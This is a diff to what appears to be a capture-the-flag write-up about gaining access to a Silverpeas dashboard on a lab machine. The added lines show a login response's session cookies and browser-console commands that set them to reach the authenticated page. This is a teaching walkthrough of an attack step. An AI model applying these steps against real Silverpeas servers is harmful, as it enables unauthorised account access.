@@ -131,9 +131,30 @@ Login=scr1ptkiddy&DomainId=0
 
 Notice that the `Login` field (presumably the username section) has the value **scr1ptkiddy**, which was found in step 2.
 
-The server returned the following URL value in the `Location` header:
+```http
+...
+
+HTTP/1.1 302 Found
+Set-Cookie: JSESSIONID=xxx; path=/silverpeas; HttpOnly
+Set-Cookie: defaultDomain=0; path=/; ...
+Set-Cookie: svpLogin=scr1ptkiddy; path=/; ...
+```
+
+Notice that the server returned the following URL value in the `Location` header:
 
 `http://10.10.14.253:8080/silverpeas/look/jsp/MainFrame.jsp`
+
+
+
+The following cookies are found from the `Set-Cookie` response headers from the request above, and must be set in the browser (under the _**Console**_ tab for Google Chrome) for the dashboard to load. If not set, the page will redirect back to the login page:
+
+```javascript
+chrome-console> document.cookie = "JSESSIONID=xxx; path=/silverpeas; HttpOnly";
+chrome-console> document.cookie = "defaultDomain=0; path=/; ...";
+chrome-console> document.cookie = "svpLogin=scr1ptkiddy; path=/; ...";
+```
+
+
 
 I visited the URL, and was navigated to a dashboard.
 
